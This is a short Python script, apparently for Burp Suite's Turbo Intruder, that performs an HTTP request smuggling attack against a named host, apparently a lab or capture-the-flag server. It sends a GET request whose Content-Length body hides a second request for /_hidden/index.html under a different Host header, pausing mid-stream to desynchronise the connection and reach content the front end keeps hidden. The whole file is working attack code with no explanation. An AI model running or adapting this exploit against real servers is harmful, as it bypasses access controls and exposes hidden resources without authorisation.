def queueRequests(target, _):
    engine = RequestEngine(endpoint="http://docker.vigneshsb.fun:80",
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # attack request
    attack_request = """GET /a HTTP/1.1
Host: localhost
Content-Length: %s

%s"""

    # smuggled request GET
    smuggled_request = """GET /_hidden/index.html HTTP/1.1
Host: notlocalhost

"""

    # normal request
    normal_request = """GET / HTTP/1.1
Host: localhost

"""
    engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=6)
    engine.queue(normal_request)


def handleResponse(req, _):
    table.add(req)
